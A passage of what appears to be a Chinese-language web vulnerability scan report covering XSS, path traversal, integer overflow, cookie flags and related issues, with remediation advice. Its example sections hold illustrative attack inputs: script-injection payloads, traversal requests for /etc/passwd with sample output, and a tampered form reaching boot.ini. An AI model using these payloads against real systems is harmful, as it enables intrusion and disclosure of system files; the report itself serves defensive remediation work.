之類的查詢位置保留元，它會自動跳出取代位置保留元的值。</div><div></div><div>參照</div><a href="http://ca3.php.net/mysql_real_escape_string">http://ca3.php.net/mysql_real_escape_string</a><br /><a href="http://ca.php.net/mysql_escape_string">http://ca.php.net/mysql_escape_string</a><br /><a href="http://ca.php.net/addslashes">http://ca.php.net/addslashes</a><br /><a href="http://pear.php.net/package-info.php?package=DB">http://pear.php.net/package-info.php?package=DB</a><br /><div></div><div></div><div>** 驗證輸入資料：</div><div></div><div>雖然為了使用者的方便，可以在用戶端層提供資料驗證，但一律必須在伺服器層執行資料驗證。用戶端驗證原本就不安全，因為它們可以輕易略過，例如：停用 JavaScript。</div><div></div><div>好的設計通常需要 Web 應用程式架構提供伺服器端公用程式常式來驗證下列項目：</div><div>[1] 必要欄位</div><div>[2] 欄位資料類型（依預設，所有 HTTP 要求參數都是 String）</div><div>[3] 欄位長度</div><div>[4] 欄位範圍</div><div>[5] 欄位選項</div><div>[6] 欄位型樣</div><div>[7] Cookie 值</div><div>[8] HTTP 回應</div><div></div><div>在實務中，好的做法是實作一或多個驗證各個應用程式參數的函數。下列各節說明一些檢查範例。</div><div></div><div>[1] 必要欄位</div><div>一律檢查確認欄位不是空值，欄位長度大於零，且不含在前端及尾端的空格。</div><div>如何驗證必要欄位的範例：</div><div>  // PHP example to validate required fields
  function validateRequired($input) {
      ...
      $pass = false;
      if (strlen(trim($input))&gt;0){
          $pass = true;
      }
      return $pass;
      ...
  }
  ...
  if (validateRequired($fieldName)) {
      // fieldName is valid, continue processing request
      ...
  }
</div><div></div><div></div><div>[2] 欄位資料類型</div><div>在 Web 應用程式中，所輸入的輸入參數設定不良。例如，所有 HTTP 要求參數或 Cookie 值都是 String 類型。開發人員負責確認輸入的資料類型正確。</div><div></div><div>[3] 欄位長度</div><div>一律確定輸入參數（HTTP 要求參數或 Cookie 值）在長度下限及/或長度上限的範圍內。</div><div></div><div>[4] 欄位範圍</div><div>一律確定輸入參數在函數需求定義的範圍內。</div><div></div><div>[5] 欄位選項</div><div>Web 應用程式通常會向使用者呈現一組可供選擇的選項（例如：使用 SELECT HTML 標籤），但無法執行伺服器端驗證來確保所選的值是容許的選項之一。請記住，惡意的使用者可以輕易修改任何選項值。請一律對照函數需求所定義容許的選項來驗證所選的使用者值。</div><div></div><div>[6] 欄位型樣</div><div>一律檢查使用者輸入是否符合功能需求所定義的型樣。比方說，如果 userName 欄位只應接受英數字元，且不區分大小寫，請使用下列正規表示式：</div><div>^[a-zA-Z0-9]+$</div><div></div><div>[7] Cookie 值</div><div>依應用程式需求而定，相同的驗證規則（說明如上）也適用於 Cookie 值，例如：驗證必要的值、驗證長度，等等。</div><div></div><div>[8] HTTP 回應</div><div></div><div>[8-1] 過濾使用者輸入</div><div>如果要保護應用程式免於遭受跨網站指令碼，開發人員應該將機密字元轉換成對應的字元實體來消毒 HTML。以下是 HTML 區分字元：</div><div>&lt; &gt; " ' % ; ) ( &amp; +</div><div></div><div>PHP 包括一些 htmlentities() 之類的自動化消毒公用程式函數：</div><div></div><div>  $input = htmlentities($input, ENT_QUOTES, 'UTF-8');
</div><div></div><div>此外，為了避免「跨網站指令碼」的 UTF-7 變式，您應該明確定義回應的 Content-Type 標頭，例如：</div><div></div><div>  &lt;?php
  
  header('Content-Type: text/html; charset=UTF-8');
  
  ?&gt;
</div><div></div><div>[8-2] 維護 Cookie 安全</div><div></div><div>當機密資料儲存在 Cookie 中，且透過 SSL 來傳輸它時，請務必先在 HTTP 回應中設定 Cookie 的安全旗標。這會指示瀏覽器只透過 SSL 連線來使用這個 Cookie。</div><div></div><div>您可以利用下列程式碼範例來維護 Cookie 安全：</div><div></div><div>  &lt;$php
  
      $value = "some_value";
      $time = time()+3600;
      $path = "/application/";
      $domain = ".example.com";
      $secure = 1;
  
      setcookie("CookieName", $value, $time, $path, $domain, $secure, TRUE);
  ?&gt;
  
</div><div></div><div>此外，我們建議您使用 HttpOnly 旗標。當 HttpOnly 旗標設為 TRUE 時，只能透過 HTTP 通訊協定來存取 Cookie。這表示無法用 JavaScript 之類的 Scripting 語言存取 Cookie。這個設定有助於實際減少透過 XSS 攻擊來盜用身分的情況（不過，並非所有瀏覽器都支援）。</div><div></div><div>PHP 5.2.0 新增 HttpOnly 旗標。</div><div></div><div>參照</div><div></div><div>[1] 利用「HTTP 專用 Cookie」緩和「跨網站指令碼」： </div><a href="http://msdn2.microsoft.com/en-us/library/ms533046.aspx">http://msdn2.microsoft.com/en-us/library/ms533046.aspx</a><br /><div>[2] PHP 安全聯盟： </div><a href="http://phpsec.org/">http://phpsec.org/</a><br /><div>[3] PHP &amp; Web 應用程式安全部落格 (Chris Shiflett)： </div><a href="http://shiflett.org/">http://shiflett.org/</a><br /></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/89.html">89</a><br /><a href="http://cwe.mitre.org/data/definitions/74.html">74</a><br /><a href="http://cwe.mitre.org/data/definitions/707.html">707</a><br /><a href="http://cwe.mitre.org/data/definitions/943.html">943</a><br /><a href="http://cwe.mitre.org/data/definitions/20.html">20</a><br /></div><div class="noPageBreak" xmlns=""><h4>外部參照：</h4><a href="http://www.cgisecurity.com/lib/webappdis.doc">"Web Application Disassembly with ODBC Error Messages"（作者：David Litchfield）</a><br /><a href="http://shh.thathost.com/text/binary-search-sql-injection.txt">"Using Binary Search with SQL Injection"（作者：Sverre H. Huseby）</a><br /></div><div class="h2group" id="attCrossSiteScripting" xmlns=""><h2>反映型跨網站指令碼</h2><a name="attCrossSiteScripting_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="padding-left: 1.2em; margin-top:0"><li>攻擊者將惡意程式碼傳送至受害者的瀏覽器時（多數使用 JavaScript），就會產生跨網站指令碼 (XSS) 弱點。有弱點的 Web 應用程式可能會在未進行過濾或編碼的情況下於輸出中內嵌不受信任的資料。因此，攻擊者可以將惡意 Script 注入至應用程式，並且會在回應中傳回 Script。接著將會在受害者的瀏覽器上執行此 Script。</li><li>特別是，對使用者輸入或不受信任的資料，無法正確地執行危險字元的消毒。</li><li>在反映型攻擊中，攻擊者會誘騙一般使用者將包含惡意程式碼的要求傳送至有弱點的 Web 伺服器，接著將攻擊反映回一般使用者的瀏覽器。</li><li>伺服器直接透過 HTTP 要求接收惡意資料，並在 HTTP 回應中將它反映回去。傳送惡意內容的最常見方法是將它新增為 URL 中的參數，而此 URL 會公開張貼或直接以電子郵件直接傳送給受害者。包含惡意 Script 的 URL 構成多種網路釣魚架構的核心，因此，被說服的受害者會造訪參照有弱點網站的 URL。網站接著會將惡意內容反映回受害者，然後由受害者的瀏覽器執行內容。</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>XSS 攻擊可以公開使用者的階段作業 Cookie，容許攻擊者強制存取使用者的階段作業以及存取使用者的帳戶，進而導致模擬使用者。</div><div>攻擊者可以修改和檢視使用者記錄，以及以這些使用者的身分執行交易。攻擊者可能可以代表使用者來執行特許作業，或存取任何屬於使用者的機密資料。如果使用者具有管理員許可權，則此情況特別危險。</div><div>攻擊者甚至可以在受害者的瀏覽器上執行惡意 Script，而此 Script 會將使用者重新導向至其他頁面或網站、修改內容呈現，或是甚至可能執行惡意軟體或加密採礦程式。</div></ul></div><div style="overflow:hidden" xmlns=""><h4>惡意探索例子：</h4><div>下列範例顯示在回應中傳回參數值的 Script。</div><div>參數值會使用 GET 要求傳送至 Script，然後在 HTML 中所內嵌的回應內傳回。</div><div class="code">[REQUEST]
GET /index.aspx?name=JSmith HTTP/1.1
</div><br /><div class="code">[RESPONSE]
HTTP/1.1 200 OK
Server: SomeServer
Date: Sun, 01 Jan 2002 00:31:19 GMT
Content-Type: text/html
Accept-Ranges: bytes
Content-Length: 27

&lt;HTML&gt;
Hello JSmith
&lt;/HTML&gt;
</div><br /><div>攻擊者可能利用這類攻擊。在此情況下，將由瀏覽器執行 JavaScript 程式碼。</div><div class="code">[REQUEST]
GET /index.aspx?name=&gt;"'&gt;&lt;script&gt;alert('XSS')&lt;/script&gt; HTTP/1.1
</div><br /><div class="code">[RESPONSE]
HTTP/1.1 200 OK
Server: SomeServer
Date: Sun, 01 Jan 2002 00:31:19 GMT
Content-Type: text/html
Accept-Ranges: bytes
Content-Length: 83

&lt;HTML&gt;
Hello &gt;"'&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;
&lt;/HTML&gt;
</div><br /></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>完整編碼來自插入至網頁之不受信任來源的所有動態資料，以確保將其視為純文字，而非可執行的 Script 或可呈現的標記。</div><div>請考慮要在其中使用資料的環境定義，並且盡可能依環境定義將資料編碼為接近實際輸出：例如適用於 HTML 內容的 HTML 編碼；適用於屬性值之資料輸出的 HTML 屬性編碼；適用於動態產生之 JavaScript 的 JavaScript 編碼。例如，HTML 將非英數字元編碼為 HTML 實體時，`&lt;` 和 `&gt;` 將會變成 `&amp;lt;` 和 `&amp;gt;`。</div><div>額外的防範措施是不論來源為何，都會驗證伺服器上的所有外部輸入。請依據定義資料類型、大小、範圍、格式和可接受值的嚴密正面規格（容許清單），仔細檢查每個輸入參數。在部分情況下，正規表示式或架構控制項可能十分有用，但這不是輸出編碼的取代項目。</div><div>無論來源為何，都必須完成所有不受信任資料的輸出編碼和資料驗證：例如表單欄位、URL 參數、Web 服務引數、Cookie、任何來自網路的資料、環境變數、反向 DNS 查閱、查詢結果、要求標頭、URL 元件、電子郵件、檔案和檔名、資料庫，以及所有向應用程式提供資料的外部系統。請記住，可以透過 API 呼叫間接取得這類輸入。</div><div>針對伺服器所傳回的每個網頁，明確地設定 `Content-Type` HTTP 回應標頭。此標頭值應該定義特定字元編碼（字集）。例如 `ISO-8859-1` 或 `UTF-8`。未指定編碼時，Web 瀏覽器可能會猜測網頁實際使用的編碼以選擇不同的編碼，但這樣容許潛在的攻擊者略過 XSS 保護。</div><div>此外，請在階段作業 Cookie 上設定 `httpOnly` 旗標，防止任何 XSS 惡意探索竊取使用者的 Cookie。</div><div>偏好使用可根據環境定義自動編碼所有動態輸出以防止此弱點的架構或標準程式庫，或至少提供的建構可更輕鬆地避免弱點。</div><div>針對伺服器所傳回的每個網頁，明確地設定 `Content-Security-Policy` HTTP 回應標頭，讓攻擊者更難實際惡意探索 XSS 攻擊。</div></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/79.html">79</a><br /><a href="http://cwe.mitre.org/data/definitions/74.html">74</a><br /><a href="http://cwe.mitre.org/data/definitions/707.html">707</a><br /><a href="http://cwe.mitre.org/data/definitions/20.html">20</a><br /></div><div class="noPageBreak" xmlns=""><h4>外部參照：</h4><a href="https://owasp.org/www-community/attacks/xss/">跨網站指令碼 (XSS)</a><br /><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS 速查表</a><br /></div><div class="h2group" id="attNullByte" xmlns=""><h2>擷取毒害空值位元組 Windows 檔案</h2><a name="attNullByte_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="padding-left: 1.2em; margin-top:0"><li>應用程式會接收來自使用者之目錄或檔案的名稱。如果這用來直接建立檔案路徑，則可以操作路徑來指向不應該容許存取或是可能包含惡意資料或程式碼的目錄和檔案。</li><li>特別是，未檢查使用者輸入中的 '..' (點點) 型樣或目錄分隔字元 (通常是斜線)，而且檔案許可權未受限。</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>攻擊者可能會修改、刪除或讀取 Web 伺服器上應用程式可存取之任何檔案（例如，資料庫、使用者資訊或配置檔）的內容。</div><div>攻擊者可能嘗試毀損或移除應用程式或作業系統所使用的重要檔案進而導致 DoS 攻擊，甚至將資料新增至檔案。</div><div>攻擊也可以用來刪除日誌檔案，內含可用來追蹤攻擊者的資訊。</div></ul></div><div style="overflow:hidden" xmlns=""><h4>惡意探索例子：</h4><div>下列範例顯示回應中傳回之內部檔案的內容。</div><div>下列範例顯示應用程式如何處理使用中資源。</div><div class="code">[REQUEST]
/get-files.jsp?file=report.pdf HTTP/1.1
</div><br /><div class="code">[RESPONSE]
HTTP/1.1 200 OK
...
...
%PDF......
.....
%%EOF
</div><br /><div>攻擊者可能使用 ../../../../ 這類路徑遍訪攻擊來誘騙應用程式提供所需目錄外部的檔案</div><div class="code">[REQUEST]
GET /get-files?file=../../../../etc/passwd HTTP/1.1
</div><br /><div class="code">[RESPONSE]
HTTP/1.1 200 OK
.....
.....
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
smithj:x:561:561:Joe Smith:/home/smithj:/bin/bash
</div><br /></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>若要防止此類型的攻擊，您應該先消毒由使用者提供且將用來建置路徑的所有資料 。此作業的最佳方式是使用容許清單。容許清單是應用程式將接受的已接受值清單。例如，由使用者提供且要插入至路徑字串之資料的容許清單將會只有可能容許底線 (_) 和橫線 (-) 字元的英數字元。</div><div>除了使用容許清單技術之外，伺服器應禁止存取檔案系統的所有區域，但特別用於 Web 應用程式的區域除外。這將防止使用者嘗試中斷 Web 應用程式目錄以及存取檔案系統之其他區域中的檔案。</div><div>強制只能開啟特定副檔名</div><div>移除使用者輸入中的特殊字元（中繼字元），例如垂直線 (|) 字元</div><div>先標準化路徑名稱，再對其進行驗證</div></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/626.html">626</a><br /><a href="http://cwe.mitre.org/data/definitions/707.html">707</a><br /><a href="http://cwe.mitre.org/data/definitions/147.html">147</a><br /><a href="http://cwe.mitre.org/data/definitions/20.html">20</a><br /></div><div class="noPageBreak" xmlns=""><h4>外部參照：</h4><a href="https://owasp.org/www-community/attacks/Path_Traversal">OWASP 文章 - 路徑遍訪</a><br /></div><div class="h2group" id="attIntegerOverflow" xmlns=""><h2>整數溢位</h2><a name="attIntegerOverflow_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><li>以整數資料類型（包括位元組、短整數、長整數及其他類型）儲存太大的值（大於變數可保留的最大值）時，發生整數溢位（或回歸）。遺失整數的最高有效位元，而剩餘值相對於最小值（0 或帶正負號類型的極大負值）。</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>發生整數溢位時，解譯的值似乎已回歸超過最大值，並重設回最小值。</div><div>值可以非預期地變為零或負值。如果使用該值來控制迴圈、管理資源（例如記憶體配置）或進行商業邏輯決策，則這可能會有安全隱患。</div><div>例如，交易完成時，除了客戶所購買的東西之外，整數溢位可能還會把錢給客戶。</div><div>特別是，如果數學運算導致可能大於整數類型最大值的數字，則值會回歸，而且變數會設定為零或負值。</div><div>i=UINT_MAX+1; // 不帶正負號整數類型之變數的最大值 - 4294967295 (0xffffffff)。結果是：i=0</div></ul></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>先驗證所有輸入都在預期範圍內以及正負號，再依賴其值或將它們用於算數計算。</div><div>請務必檢查上下限，包括帶正負號之整數的負下限（整數溢位也可能具有極大的負數）。</div><div>可能的話，請使用不帶正負號的整數。</div><div>請考慮使用安全整數處理程式庫（例如 C/C++ SafeInt 或 IntegerLib）。</div><div>請考慮啟用可防止部分緩衝區溢位類別的編譯器延伸。</div></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/190.html">190</a><br /><a href="http://cwe.mitre.org/data/definitions/707.html">707</a><br /><a href="http://cwe.mitre.org/data/definitions/20.html">20</a><br /></div><div class="noPageBreak" xmlns=""><h4>外部參照：</h4><a href="https://docs.microsoft.com/en-us/cpp/safeint/safeint-library?view=msvc-160">SafeInt 程式庫</a><br /></div><div class="h2group" id="GV_StoredXSS" xmlns=""><h2>預存的跨網站指令碼</h2><a name="GV_StoredXSS_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="padding-left: 1.2em; margin-top:0"><li>攻擊者將惡意程式碼傳送至受害者的瀏覽器時（多數使用 JavaScript），就會產生跨網站指令碼 (XSS) 弱點。有弱點的 Web 應用程式可能會在未進行過濾或編碼的情況下於輸出中內嵌不受信任的資料。因此，攻擊者可以將惡意 Script 注入至應用程式，並且會在回應中傳回 Script。接著將會在受害者的瀏覽器上執行此 Script。</li><li>特別是，對使用者輸入或不受信任的資料，無法正確地執行危險字元的消毒。</li><li>預存的跨網站指令碼 這種攻擊會在伺服器上永久儲存跨網站指令碼 有效負載。完成這種攻擊的不同方式包括將惡意 Scripts 傳送至訊息討論區、訪客日誌或網頁的註解區段；新增將儲存至永久位置（例如檔案或資料庫）或使用記載機制登入的表單欄位；或者甚至在社交網路上注入惡意頁面等。除非使用者或管理員瀏覽至取得此預存惡意探索程式碼的頁面，否則此惡意程式碼仍會無聲地儲存在受信任的伺服器上。接著會將它讀取回應用程式並包括在動態內容中，而且向使用者顯示它。此時，會在受害者的瀏覽器上執行程式碼。</li><li>此惡意探索經常管用，因為許多開發人員都信任他們自己的資料庫和檔案系統。不幸的是，攻擊者通常會尋找繞過其防禦的方法，並將惡意探索程式碼植入這些受信任的系統內。</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>XSS 攻擊可以公開使用者的階段作業 Cookie，容許攻擊者強制存取使用者的階段作業以及存取使用者的帳戶，進而導致模擬使用者。</div><div>攻擊者可以修改和檢視使用者記錄，以及以這些使用者的身分執行交易。攻擊者可能可以代表使用者來執行特許作業，或存取任何屬於使用者的機密資料。如果使用者具有管理員許可權，則此情況特別危險。</div><div>攻擊者甚至可以在受害者的瀏覽器上執行惡意 Script，而此 Script 會將使用者重新導向至其他頁面或網站、修改內容呈現，或是甚至可能執行惡意軟體或加密採礦程式。</div></ul></div><div style="overflow:hidden" xmlns=""><h4>惡意探索例子：</h4><div>下列範例顯示後續要求中反映的參數值。</div><div>使用 GET 要求將參數值傳送至 Script。系統會傳回值，同時儲存值以作為未來搜尋歷程。</div><div class="code">[REQUEST]
GET /search.jsp?term=JSmith HTTP/1.1
</div><br /><div class="code">[RESPONSE]
&lt;HTML&gt;
    &lt;BODY&gt;
        No articles match your search term: JSmith
        &lt;BR&gt;
        &lt;BR&gt;
        Previous searches:
    &lt;/BODY&gt;
&lt;/HTML&gt;
</div><br /><div>嘗試惡意探索的攻擊將會看到傳回適當編碼的值，以避免反映型跨網站指令碼。不過，現在會出現先前的搜尋。</div><div class="code">[REQUEST]
GET /search.jsp?term=&lt;script&gt;alert('XSS')&lt;/script&gt; HTTP/1.1
</div><br /><div class="code">[RESPONSE]
&lt;HTML&gt;
    &lt;BODY&gt;
        No articles match your search term: &amp;lt;script&amp;gt;alert(XSS)&amp;lt;/script&amp;gt;
        &lt;BR&gt;
        &lt;BR&gt;
        Previous searches:
        &lt;a href='./search.jsp?query=JSmith'&gt;JSmith&lt;/a&gt;
    &lt;/BODY&gt;
&lt;/HTML&gt;
</div><br /><div>已儲存原始攻擊有效負載，並且針對未來要求予以附加，甚至針對合法搜尋也是一樣。在此情況下，系統會錯誤地新增該有效負載，而未先進行編碼。</div><div class="code">[REQUEST]
GET /search.jsp?term=&gt;JohnS HTTP/1.1
</div><br /><div class="code">[RESPONSE]
&lt;HTML&gt;
    &lt;BODY&gt;
        No articles match your search term: JohnS
        &lt;BR&gt;
        &lt;BR&gt;
        Previous searches:
        &lt;a href='/search.jsp?query=&lt;script&gt;alert(XSS)&lt;/script&gt;'&gt;&lt;script&gt;alert(XSS)&lt;/script&gt;&lt;/a&gt;
        &lt;a href='./search.jsp?query=JSmith'&gt;JSmith&lt;/a&gt;
    &lt;/BODY&gt;
&lt;/HTML&gt;
</div><br /></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>完整編碼來自插入至網頁之不受信任來源的所有動態資料，以確保將其視為純文字，而非可執行的 Script 或可呈現的標記。</div><div>請考慮要在其中使用資料的環境定義，並且盡可能依環境定義將資料編碼為接近實際輸出：例如適用於 HTML 內容的 HTML 編碼；適用於屬性值之資料輸出的 HTML 屬性編碼；適用於動態產生之 JavaScript 的 JavaScript 編碼。例如，HTML 將非英數字元編碼為 HTML 實體時，`&lt;` 和 `&gt;` 將會變成 `&amp;lt;` 和 `&amp;gt;`。</div><div>額外的防範措施是不論來源為何，都會驗證伺服器上的所有外部輸入。請依據定義資料類型、大小、範圍、格式和可接受值的嚴密正面規格（容許清單），仔細檢查每個輸入參數。在部分情況下，正規表示式或架構控制項可能十分有用，但這不是輸出編碼的取代項目。</div><div>無論來源為何，都必須完成所有不受信任資料的輸出編碼和資料驗證：例如表單欄位、URL 參數、Web 服務引數、Cookie、任何來自網路的資料、環境變數、反向 DNS 查閱、查詢結果、要求標頭、URL 元件、電子郵件、檔案和檔名、資料庫，以及所有向應用程式提供資料的外部系統。請記住，可以透過 API 呼叫間接取得這類輸入。</div><div>針對伺服器所傳回的每個網頁，明確地設定 `Content-Type` HTTP 回應標頭。此標頭值應該定義特定字元編碼（字集）。例如 `ISO-8859-1` 或 `UTF-8`。未指定編碼時，Web 瀏覽器可能會猜測網頁實際使用的編碼以選擇不同的編碼，但這樣容許潛在的攻擊者略過 XSS 保護。</div><div>此外，請在階段作業 Cookie 上設定 `httpOnly` 旗標，防止任何 XSS 惡意探索竊取使用者的 Cookie。</div><div>偏好使用可根據環境定義自動編碼所有動態輸出以防止此弱點的架構或標準程式庫，或至少提供的建構可更輕鬆地避免弱點。</div><div>針對伺服器所傳回的每個網頁，明確地設定 `Content-Security-Policy` HTTP 回應標頭，讓攻擊者更難實際惡意探索 XSS 攻擊。</div></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/79.html">79</a><br /><a href="http://cwe.mitre.org/data/definitions/74.html">74</a><br /><a href="http://cwe.mitre.org/data/definitions/707.html">707</a><br /><a href="http://cwe.mitre.org/data/definitions/20.html">20</a><br /></div><div class="noPageBreak" xmlns=""><h4>外部參照：</h4><a href="https://owasp.org/www-community/attacks/xss/">跨網站指令碼 (XSS)</a><br /><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS 速查表</a><br /></div><div class="h2group" id="attVtiCnf" xmlns=""><h2>Microsoft FrontPage 目錄清單</h2><a name="attVtiCnf_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><li>已使用不適當的安全設定來安裝 FrontPage Server Extensions</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>有可能檢視及下載某些 Web 應用程式虛擬目錄的內容，其可能包含受限的檔案</div><div>Web 伺服器通常配置成不允許目錄清單含有 Script 或文字內容。</div><div>部分第三方產品會建立含有正式作業檔案之副本的輔助目錄。</div><div>如果存取這些目錄並不受限，攻擊者便可以下載這些目錄中的檔案。</div><div>Microsoft 的 FrontPage 便是會建立這類輔助目錄的產品。</div></ul></div><div class="noPageBreak" xmlns=""><h4>受影響的產品：</h4><ul style="&#xA;							list-style: none; padding-left: 0; margin-top:0;&#xA;						"><div>這個問題可能會影響不同類型的產品。</div></ul></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>請確定 Web 伺服器用戶端無法直接存取這類產品所建立的目錄（如 CVS、RCS 或 FrontPage 目錄）。</div><div>請將 Web 伺服器配置成這些目錄都不可存取（所有一般 Web 伺服器都有拒絕存取特定目錄的選項）。</div></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/548.html">548</a><br /></div><div class="noPageBreak" xmlns=""><h4>外部參照：</h4><a href="http://www.webappsec.org/projects/threat/classes/directory_indexing.shtml">WASC 威脅分類：目錄檢索</a><br /></div><div class="h2group" id="attSameSiteCookie" xmlns=""><h2>SameSite 屬性不安全、不適當或遺漏的 Cookie</h2><a name="attSameSiteCookie_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><li>SameSite 屬性不適當、不安全或遺漏的機密 Cookie</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>將 Cookie 限制為第一方或相同網站環境定義，藉此預防 Cookie 資訊洩漏。</div><div>如果沒有設置額外的保護措施（如反 CSRF 記號），攻擊者可以延伸為偽造跨網站要求 (CSRF) 攻擊。</div><div>SameSite 屬性控制跨網域要求的 Cookie 傳送方式。</div><div></div><div>屬性的值有三個：「Lax」、「Strict」或「None」。如果您使用「None」，網站可以建立與其他網站之間的跨網域 POST HTTP 要求，而瀏覽器會自動將 Cookie 新增到該要求中。</div><div></div><div>如果沒有設置額外的保護措施（如反 CSRF 記號），可能會引發偽造跨網站要求 (CSRF) 攻擊。</div><div>模式與其用法：</div><div>「Lax」模式：Cookie 只會連同最上層 GET 要求一同傳送。</div><div>「Strict」模式：即使使用者遵循其他網站的鏈結，Cookie 也不會連同任何跨網站用法一同傳送。</div><div>「None」模式：Cookie 將連同跨網站要求一同傳送。</div><div></div><div>擁有「Lax」或「None」的屬性必須設定「Secure」旗標，而且必須透過 https 傳輸。</div><div>範例 - Set-Cookie: key=value; SameSite=Lax;Secure</div><div></div><div>建議選項是將屬性設定為「Strict」。</div><div>範例 - Set-Cookie: key=value; SameSite=Strict</div></ul></div><div class="noPageBreak" xmlns=""><h4>受影響的產品：</h4><ul style="&#xA;							list-style: none; padding-left: 0; margin-top:0;&#xA;						"><div>此問題可能會影響各種類型的產品。</div></ul></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>[1] 檢閱將 SameSite Cookie 屬性配置為建議值的可能解決方案。[2] 將 Cookie 限制為第一方或相同網站環境定義。</div><div>[3] 將 Cookie 的 SameSite 屬性設定為 Strict 並加以驗證，確保 Cookie 只能在第一方環境定義中傳送。</div><div>[4] 或者，如果您想要放鬆第一方環境定義的限制，請將 Cookie 的 SameSite 屬性設定為 Lax 並啟用 Secure 旗標，再透過 HTTPS 傳輸，同時加以驗證。</div></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/1275.html">1275</a><br /><a href="http://cwe.mitre.org/data/definitions/284.html">284</a><br /><a href="http://cwe.mitre.org/data/definitions/923.html">923</a><br /></div><div class="noPageBreak" xmlns=""><h4>外部參照：</h4><a href="http://www.webappsec.org/projects/threat/classes/information_leakage.shtml">WASC 威脅分類：資訊洩漏</a><br /><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite">SameSite Cookie</a><br /></div><div class="h2group" id="attFileWin32" xmlns=""><h2>Windows 檔案參數變更</h2><a name="attFileWin32_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="padding-left: 1.2em; margin-top:0"><li>未正確地消毒使用者所輸入的危險字元</li><li>未檢查使用者輸入是否有 '..' （雙點）字串</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>有可能檢視 Web 伺服器上任何檔案（例如：資料庫、使用者資訊或配置檔）的內容，但受 Web 伺服器使用者的許可權限制</div><div>CGI Script 通常含有一些參數，用來指定顯示的檔案或作為範本的檔案。</div><div>如果應用程式未驗證提供給 Script 的檔名，攻擊者就可以操作這個參數，然後要求在伺服器上的其他檔案。</div><div>範例：</div><div>[原始 HTML 表單]</div><div>  &lt;FORM METHOD=POST ACTION="/cgi-bin/vulnerable_script.cgi"&gt;
  ...
  &lt;INPUT TYPE=HIDDEN NAME="template" VALUE="/dir1/dir2/template.txt"&gt;
  ...
  &lt;/FORM&gt;
</div><div>[操作的 HTML 表單]</div><div>  &lt;FORM METHOD=POST ACTION="http://target/cgi-bin/vulnerable_script.cgi"&gt;
  ...
  &lt;INPUT TYPE=HIDDEN NAME="template" VALUE="../../../../../boot.ini"&gt;
  ...
  &lt;/FORM&gt;
